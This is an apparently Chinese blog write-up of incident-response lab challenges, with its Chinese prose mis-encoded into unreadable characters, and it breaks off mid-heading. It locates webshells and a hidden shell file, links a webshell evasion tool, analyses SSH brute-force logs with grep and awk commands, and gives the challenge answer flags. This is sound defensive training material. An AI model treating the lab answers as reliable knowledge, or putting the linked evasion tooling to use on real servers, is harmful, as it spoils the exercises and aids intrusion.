flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</h2><p>ç”¨dç›¾æ‰«å¯ä»¥æ‰«å‡ºä¸‰ä¸ªwebshell<br><img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241121-091404035.png" class=""><br>ä»ä¸Šåˆ°ä¸‹åˆ†åˆ«æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œå“¥æ–¯æ‹‰é©¬å’Œæ··æ·†ä¸€å¥è¯<br>æ‰“å¼€å“¥æ–¯æ‹‰é©¬å¯ä»¥æ‰¾åˆ°flag<br><img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241121-091450601.png" class="">  </p><h2 id="2-é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell-githubåœ°å€çš„md5-flag-md5"><a href="#2-é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell-githubåœ°å€çš„md5-flag-md5" class="headerlink" title="2.é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell githubåœ°å€çš„md5 flag{md5}"></a>2.é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell githubåœ°å€çš„md5 flag{md5}</h2><p>å“¥æ–¯æ‹‰é©¬<br><a href="https://github.com/Tas9er/ByPassBehinder">https://github.com/Tas9er/ByPassBehinder</a></p><h2 id="3-é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5-flag-md5-æ³¨-xxx-xxx-xxx-xxx-xxx-xxx"><a href="#3-é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5-flag-md5-æ³¨-xxx-xxx-xxx-xxx-xxx-xxx" class="headerlink" title="3.é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5 flag{md5} æ³¨ : /xxx/xxx/xxx/xxx/xxx.xxx"></a>3.é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5 flag{md5} æ³¨ : /xxx/xxx/xxx/xxx/xxx.xxx</h2><p>æˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤æ¥è¯»å–webå‘½ä»¤ä¸‹çš„æ‰€æœ‰éšè—æ–‡ä»¶<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /<span class="keyword">var</span>/www/html/ -type f -name <span class="string">&quot;.*&quot;</span></span><br></pre></td></tr></table></figure><br><img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241121-091648832.png" class=""><br>å¯ä»¥å‘ç°ä¸€ä¸ªphpæ–‡ä»¶<br><img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241121-091712366.png" class=""><br>è¯»å–åå‘ç°å…¶ä¸ºæœ¨é©¬<br>/var/www/html/include/Db/.Mysqli.php</p><h2 id="4-é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„-md5-flag-md5"><a href="#4-é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„-md5-flag-md5" class="headerlink" title="4.é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„ md5 flag{md5}"></a>4.é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„ md5 flag{md5}</h2><p>é¢˜ç›®é—®çš„æ˜¯å…æ€é©¬ï¼Œæ­£å¸¸çš„å…æ€é©¬æ˜¯æ— æ³•é€šè¿‡å·¥å…·æ‰«æå¾—åˆ°çš„ï¼Œä¸€èˆ¬å¾—é€šè¿‡æ—¥å¿—æ¥æŸ¥çœ‹<br>è¿™é“é¢˜ç›®æ˜¯apacheçš„ç¯å¢ƒæ—¥å¿—æ–‡ä»¶ä¸º/var/log/access.log<br><img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241121-092032157.png" class=""><br>å…¶å®è¿™ä¸ªæ‰€è°“çš„å…æ€é©¬å°±æ˜¯ç»è¿‡æ··æ·†çš„æœ¨é©¬ï¼Œè€Œé‚£ç§ç¨‹åº¦çš„æ··æ·†dç›¾å®Œå…¨å¯ä»¥æ‰«æå‡ºæ¥<br><img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241121-092135422.png" class="">  </p><h1 id="ç¬¬ä¸€ç« -åº”æ€¥å“åº”-Linuxæ—¥å¿—åˆ†æ"><a href="#ç¬¬ä¸€ç« -åº”æ€¥å“åº”-Linuxæ—¥å¿—åˆ†æ" class="headerlink" title="ç¬¬ä¸€ç«  åº”æ€¥å“åº”-Linuxæ—¥å¿—åˆ†æ"></a>ç¬¬ä¸€ç«  åº”æ€¥å“åº”-Linuxæ—¥å¿—åˆ†æ</h1><div class="table-container"><table><thead><tr><th>æ—¥å¿—æ–‡ä»¶</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>/var/log/cron</td><td>è®°å½•äº†ç³»ç»Ÿå®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ—¥å¿—</td></tr><tr><td>/var/log/cups</td><td>è®°å½•æ‰“å°ä¿¡æ¯çš„æ—¥å¿—</td></tr><tr><td>/var/log/dmesg</td><td>è®°å½•äº†ç³»ç»Ÿåœ¨å¼€æœºæ—¶å†…æ ¸è‡ªæ£€çš„ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨dmesgå‘½ä»¤ç›´æ¥æŸ¥çœ‹å†…æ ¸è‡ªæ£€ä¿¡æ¯</td></tr><tr><td>/var/log/mailog</td><td>è®°å½•é‚®ä»¶ä¿¡æ¯</td></tr><tr><td>/var/log/message</td><td>è®°å½•ç³»ç»Ÿé‡è¦ä¿¡æ¯çš„æ—¥å¿—ã€‚è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ä¼šè®°å½•Linuxç³»ç»Ÿçš„ç»å¤§å¤šæ•°é‡è¦ä¿¡æ¯ï¼Œå¦‚æœç³»ç»Ÿå‡ºç°é—®é¢˜æ—¶ï¼Œé¦–å…ˆè¦æ£€æŸ¥çš„å°±åº”è¯¥æ˜¯è¿™ä¸ªæ—¥å¿—æ–‡ä»¶</td></tr><tr><td>/var/log/btmp</td><td>è®°å½•é”™è¯¯ç™»å½•æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viæŸ¥çœ‹ï¼Œè€Œè¦ä½¿ç”¨lastbå‘½ä»¤æŸ¥çœ‹</td></tr><tr><td>/var/log/lastlog</td><td>è®°å½•ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´çš„æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viï¼Œè€Œè¦ä½¿ç”¨lastlogå‘½ä»¤æŸ¥çœ‹</td></tr><tr><td>/var/log/wtmp</td><td>æ°¸ä¹…è®°å½•æ‰€æœ‰ç”¨æˆ·çš„ç™»å½•ã€æ³¨é”€ä¿¡æ¯ï¼ŒåŒæ—¶è®°å½•ç³»ç»Ÿçš„å¯åŠ¨ã€é‡å¯ã€å…³æœºäº‹ä»¶ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viï¼Œè€Œéœ€è¦ä½¿ç”¨lastå‘½ä»¤æ¥æŸ¥çœ‹</td></tr><tr><td>/var/log/utmp</td><td>è®°å½•å½“å‰å·²ç»ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šéšç€ç”¨æˆ·çš„ç™»å½•å’Œæ³¨é”€ä¸æ–­å˜åŒ–ï¼Œåªè®°å½•å½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ç›´æ¥viï¼Œè€Œè¦ä½¿ç”¨w,who,usersç­‰å‘½ä»¤æ¥æŸ¥è¯¢</td></tr><tr><td>/var/log/secure</td><td>åœ¨ Red Hat/CentOS ç­‰ç³»ç»Ÿä¸Š,è®°å½•éªŒè¯å’Œæˆæƒæ–¹é¢çš„ä¿¡æ¯ï¼Œåªè¦æ¶‰åŠè´¦å·å’Œå¯†ç çš„ç¨‹åºéƒ½ä¼šè®°å½•ï¼Œæ¯”å¦‚SSHç™»å½•ï¼Œsuåˆ‡æ¢ç”¨æˆ·ï¼Œsudoæˆæƒï¼Œç”šè‡³æ·»åŠ ç”¨æˆ·å’Œä¿®æ”¹ç”¨æˆ·å¯†ç éƒ½ä¼šè®°å½•åœ¨è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­</td></tr><tr><td>/var/log/auth.log</td><td>åœ¨ Debian/Ubuntu ç­‰ç³»ç»Ÿä¸Š,è®°å½•éªŒè¯å’Œæˆæƒæ–¹é¢çš„ä¿¡æ¯ï¼Œåªè¦æ¶‰åŠè´¦å·å’Œå¯†ç çš„ç¨‹åºéƒ½ä¼šè®°å½•ï¼Œæ¯”å¦‚SSHç™»å½•ï¼Œsuåˆ‡æ¢ç”¨æˆ·ï¼Œsudoæˆæƒï¼Œç”šè‡³æ·»åŠ ç”¨æˆ·å’Œä¿®æ”¹ç”¨æˆ·å¯†ç éƒ½ä¼šè®°å½•åœ¨è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­</td></tr></tbody></table></div><p>æˆ‘ä»¬è¦å†™çš„è¿™åˆ°é¢˜ç›®ä¸»è¦æ˜¯ç™»é™†æ—¥å¿—çš„å®¡æŸ¥å³<br>/var/log/auth.log<br>ç™»é™†å¤±è´¥æ—¥å¿—/var/log/btmp     ä½¿ç”¨lastbæŸ¥çœ‹<br>æœ€åä¸€æ¬¡ç™»é™†æ—¥å¿— /var/log/lastlog    ä½¿ç”¨lastlog<br>ç™»é™†æˆåŠŸçš„ç”¨æˆ·æ—¥å¿—/var/log/wtmp    ä½¿ç”¨last<br>ç›®å‰ç™»é™†ç”¨æˆ· /var/log/utmp    //wã€whoã€users</p><h2 id="1-æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€-â€åˆ†å‰²"><a href="#1-æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€-â€åˆ†å‰²" class="headerlink" title="1.æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²"></a>1.æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²</h2><p>æˆ‘ä»¬è¿™é‡Œç›´æ¥ä½¿ç”¨æ­£åˆ™æ¥è¿›è¡Œæ—¥å¿—å®¡æŸ¥</p><p>é¢˜ç›®é—®çˆ†ç ´çš„ipï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æ‰¾çˆ†ç ´å¤±è´¥çš„å³å¯ã€‚å†auth.logä¸­çˆ†ç ´å¤±è´¥çš„å…³æœºè¯ä¸ºFailed password for rootæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥ç›´æ¥ç­›é€‰å‡ºip<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/auth.log.1 |grep -a &quot;Failed password for root&quot;|awk &#x27;&#123;print$11&#125;&#x27;|sort -n|uniq -c|awk &#x27;&#123;print $2&#125;&#x27;</span><br></pre></td></tr></table></figure></p><img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241124-212100689.png" class="">  <p>æ¥è§£é‡Šä¸€ä¸‹ä¸Šé¢çš„æŒ‡ä»¤å§ã€‚ grep -aå°±å°†æ–‡ä»¶å¼ºåˆ¶æ˜¯ä¸ºæ–‡æœ¬æ–‡ä»¶æŸ¥æ‰¾å«ç›®æ ‡å­—ç¬¦çš„å“ªä¸€è¡Œã€‚</p><p>awk ä¸€ä¸ªåˆ†ç»„æŒ‡ä»¤å…¶ä¼šå¯¹æ–‡æœ¬çš„æ¯ä¸€è¡Œè¿›è¡Œå¤„ç†ï¼Œé»˜è®¤ä»¥ç©ºæ ¼æœªåˆ†éš”ç¬¦æ¥åˆ†ç»„ã€‚å¦‚ <code>awk &#39;&#123;print $1&#125;&#39;</code>è¾“å‡ºç¬¬ä¸€ä¸ªç»„ å³ç¬¬ä¸€åˆ—ï¼Œå…¶ä¹Ÿå¯ä»¥è¾“å‡ºå¤šç»„ <code>awk &#39;&#123;print $1,$2,$3&#125;&#39;</code></p><p>sortæ’åºå‘½ä»¤ -n ä»¥æ•°å­—æ’åºé»˜è®¤æ˜¯æŒ‰æ–‡æœ¬è¿›è¡Œæ’åº</p><p>uniq å»é‡å¹¶è®¡æ•°</p><p>flag{192.168.200.2,192.168.200.31,192.168.200.32}</p><h2 id="2-sshçˆ†ç ´æˆåŠŸç™»é™†çš„IPæ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€-â€åˆ†å‰²"><a href="#2-sshçˆ†ç ´æˆåŠŸç™»é™†çš„IPæ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€-â€åˆ†å‰²" class="headerlink" title="2.sshçˆ†ç ´æˆåŠŸç™»é™†çš„IPæ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²"></a>2.sshçˆ†ç ´æˆåŠŸç™»é™†çš„IPæ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²</h2><p>å…¶é—®ç™»é™†æˆåŠŸçš„ipå…³é”®è¯ä¸ºAccepted<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/auth.log.1 |grep -a &quot;Accepted &quot;|awk &#x27;&#123;print$11&#125;&#x27;|sort -n|uniq -c|awk &#x27;&#123;print $2&#125;&#x27;</span><br></pre></td></tr></table></figure><br><img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241124-221352445.png" class="">  </p><h2 id="3-çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€-â€åˆ†å‰²"><a href="#3-çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€-â€åˆ†å‰²" class="headerlink" title="3.çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²"></a>3.çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²</h2><p>è¯¥æ—¥å¿—çš„æ ¼å¼ä¸º <code>for xxxx for xxx.xxx.xxx</code> forä¸formä¹‹é—´ä¸ºç”¨æˆ·åè€Œfromåä¸ºip<br>å› ä¸ºæˆ‘ä»¬è¦æ‰¾å­—å…¸ï¼Œå…¶å®å°±æ˜¯æ‰¾ç™»é™†å¤±è´¥çš„ç”¨æˆ·å<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/auth.log.1 |  grep &quot;Failed password&quot; |perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br></pre></td></tr></table></figure><br>è¿™é‡Œè§£é‡Šä¸€ä¸‹<code>perl -e &#39;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#39;</code>çš„æ„æ€<br>perlæ˜¯ä¸€ä¸ªé«˜çº§ç¼–ç¨‹è¯­è¨€å…¶ç‰¹ç‚¹æ˜¯é«˜æ•ˆå¤„ç†æ–‡æœ¬ã€‚å…¶å‚æ•°æ‰§è¡Œçš„ä»£ç çš„æ„æ€å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while($_=&lt;&gt;)&#123; ... &#125;ï¼š</span><br><span class="line">&lt;&gt; æ˜¯ Perl çš„è¾“å…¥æ“ä½œç¬¦ï¼Œå®ƒä¼šä»æ ‡å‡†è¾“å…¥ä¸­é€è¡Œè¯»å–æ•°æ®ï¼Œç›´åˆ°é‡åˆ°æ–‡ä»¶ç»“å°¾ï¼ˆEOFï¼‰ã€‚</span><br><span class="line">$_ æ˜¯é»˜è®¤çš„è¾“å…¥å˜é‡ï¼Œwhile($_=&lt;&gt;)&#123; ... &#125; ä¼šå¾ªç¯å¤„ç†æ¯ä¸€è¡Œè¾“å…¥ã€‚</span><br><span class="line"></span><br><span class="line">whileå¾ªç¯é‡Œæ˜¯ä¸€ä¸ªæ­£åˆ™åŒ¹é…/for(.*?) from/å…¶åŒ¹é…for xxx from ç„¶åå†é€šè¿‡print &quot;$1\n&quot;æ¥è¾“å‡ºç¬¬ä¸€ä¸ªæ•è·ç»„ä¹Ÿå°±æ˜¯è¾“å‡ºç¬¬ä¸€ä¸ªæ‹¬å·çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·å</span><br></pre></td></tr></table></figure><br><img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241124-223310316.png" class="">  </p><h2 id="4-ç™»é™†æˆåŠŸçš„IPå…±çˆ†ç ´äº†å¤šå°‘æ¬¡"><a href="#4-ç™»é™†æˆåŠŸçš„IPå…±çˆ†ç ´äº†å¤šå°‘æ¬¡" class="headerlink" title="4.ç™»é™†æˆåŠŸçš„IPå…±çˆ†ç ´äº†å¤šå°‘æ¬¡"></a>4.ç™»é™†æˆåŠŸçš„IPå…±çˆ†ç ´äº†å¤šå°‘æ¬¡</h2><p>å‰é¢æˆ‘ä»¬å°±æ‰¾åˆ°äº†çˆ†ç ´æˆåŠŸçš„ipä¸º192.168.200.2é‚£æˆ‘ä»¬ä¹‹é—´ç”¨å¦‚ä¸‹ä»£ç æ¥çœ‹å…¶çˆ†ç ´æ¬¡æ•°<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/auth.log.1 |  grep &quot;root from 192.168.200.2&quot; </span><br></pre></td></tr></table></figure></p><p>å¦‚æœçˆ†ç ´æ¬¡æ•°è¿‡å¤šå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•æ¥ç»Ÿè®¡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/auth.log.1| grep -a &quot;Failed password for root from 192.168.200.2&quot;|awk &#x27;&#123;print $11&#125;&#x27;|uniq -c</span><br></pre></td></tr></table></figure><h2 id="5-é»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘"><a href="#5-é»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘" class="headerlink" title="5.é»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘"></a>5.é»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘</h2><p>æ–°å»ºç”¨æˆ·çš„ä»£ç ä¸ºnew useræˆ‘ä»¬è¿™é‡Œä¹‹é—´æ‰¾å°±å¥½äº†<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/auth.log.1 | grep -a &quot;new user&quot;</span><br></pre></td></tr></table></figure></p><h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1ã€å®šä½æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºçš„rootå¸å·ï¼š    </span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">å®šä½æœ‰å“ªäº›IPåœ¨çˆ†ç ´ï¼š</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿ</span><br><span class="line"> grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">2ã€ç™»å½•æˆåŠŸçš„IPæœ‰å“ªäº›ï¼š     </span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">ç™»å½•æˆåŠŸçš„æ—¥æœŸã€ç”¨æˆ·åã€IPï¼š</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class="line"></span><br><span class="line">3ã€å¢åŠ ä¸€ä¸ªç”¨æˆ·kaliæ—¥å¿—ï¼š</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">grep <span class="string">&quot;useradd&quot;</span> /var/log/secure</span> </span><br><span class="line"></span><br><span class="line">4ã€åˆ é™¤ç”¨æˆ·kaliæ—¥å¿—ï¼š</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">grep <span class="string">&quot;userdel&quot;</span> /var/log/secure</span></span><br><span class="line"></span><br><span class="line">5ã€suåˆ‡æ¢ç”¨æˆ·ï¼š</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class="line"></span><br><span class="line">sudoæˆæƒæ‰§è¡Œ:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œä¹‹é—´æŠŠåº”æ€¥å“åº”æ‰‹å†Œä¸Šçš„æ‰’ä¸‹æ¥äº†ã€‚ä¸Šé¢çš„å‘½ä»¤å’Œæˆ‘ä»¬çš„å†™çš„æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œä½†å¤§åŒå°å¼‚ï¼Œæˆ‘ä»¬ä¸»è¦çš„å…³æ³¨ç‚¹åº”è¯¥å†æ­£åˆ™åŒ¹é…çš„ç‚¹ä¸Š</p><h1 id="åº”æ€¥å“åº”-linuxå…¥ä¾µæ’æŸ¥"><a href="#åº”æ€¥å“åº”-linuxå…¥ä¾µæ’æŸ¥" class="headerlink" title="åº”æ€¥å“åº”-linuxå…¥ä¾µæ’æŸ¥"></a>åº”æ€¥å“åº”-linuxå…¥ä¾µæ’æŸ¥</h1><h2 id="1-webç›®å½•å­˜åœ¨æœ¨é©¬ï¼Œè¯·æ‰¾åˆ°æœ¨é©¬çš„å¯†ç æäº¤"><a href="#1-webç›®å½•å­˜åœ¨æœ¨é©¬ï¼Œè¯·æ‰¾åˆ°æœ¨é©¬çš„å¯†ç æäº¤" class="headerlink" title="1.webç›®å½•å­˜åœ¨æœ¨é©¬ï¼Œè¯·æ‰¾åˆ°æœ¨é©¬çš„å¯†ç æäº¤"></a>1.webç›®å½•å­˜åœ¨æœ¨é©¬ï¼Œè¯·æ‰¾åˆ°æœ¨é©¬çš„å¯†ç æäº¤</h2><img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241124-231144012.png" class="">  <img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241124-231136562.png" class="">  <p>dç›¾æ‰«ä¸€ä¸‹åœ¨1.phpæœ‰webshell<br>flag{1}</p><h2 id="2-æœåŠ¡å™¨ç–‘ä¼¼å­˜åœ¨ä¸æ­»é©¬ï¼Œè¯·æ‰¾åˆ°ä¸æ­»é©¬çš„å¯†ç æäº¤"><a href="#2-æœåŠ¡å™¨ç–‘ä¼¼å­˜åœ¨ä¸æ­»é©¬ï¼Œè¯·æ‰¾åˆ°ä¸æ­»é©¬çš„å¯†ç æäº¤" class="headerlink" title="2.æœåŠ¡å™¨ç–‘ä¼¼å­˜åœ¨ä¸æ­»é©¬ï¼Œè¯·æ‰¾åˆ°ä¸æ­»é©¬çš„å¯†ç æäº¤"></a>2.æœåŠ¡å™¨ç–‘ä¼¼å­˜åœ¨ä¸æ­»é©¬ï¼Œè¯·æ‰¾åˆ°ä¸æ­»é©¬çš„å¯†ç æäº¤</h2><img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241124-231400922.png" class="">  <p>çœ‹index.phpä¼šå‘ç°å…¶æœ‰å†™é©¬é€»è¾‘ã€‚åº”è¯¥æ˜¯index.phpå†™å…¥çš„é©¬<br> å°†å…¶md5å€¼è§£å¯†å¾—åˆ°å¯†ç ä¸ºhello</p><img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241124-234344830.png" class="">  <p>flag{hello}</p><h2 id="3-ä¸æ­»é©¬æ˜¯é€šè¿‡å“ªä¸ªæ–‡ä»¶ç”Ÿæˆçš„ï¼Œè¯·æäº¤æ–‡ä»¶å"><a href="#3-ä¸æ­»é©¬æ˜¯é€šè¿‡å“ªä¸ªæ–‡ä»¶ç”Ÿæˆçš„ï¼Œè¯·æäº¤æ–‡ä»¶å" class="headerlink" title="3.ä¸æ­»é©¬æ˜¯é€šè¿‡å“ªä¸ªæ–‡ä»¶ç”Ÿæˆçš„ï¼Œè¯·æäº¤æ–‡ä»¶å"></a>3.ä¸æ­»é©¬æ˜¯é€šè¿‡å“ªä¸ªæ–‡ä»¶ç”Ÿæˆçš„ï¼Œè¯·æäº¤æ–‡ä»¶å</h2><p>ä¸Šä¸€é¢˜å·²ç»æ‰¾åˆ°äº†<br>flag{index.php}</p><h2 id="4-é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢çš„æœåŠ¡å™¨ipæäº¤"><a href="#4-é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢çš„æœåŠ¡å™¨ipæäº¤" class="headerlink" 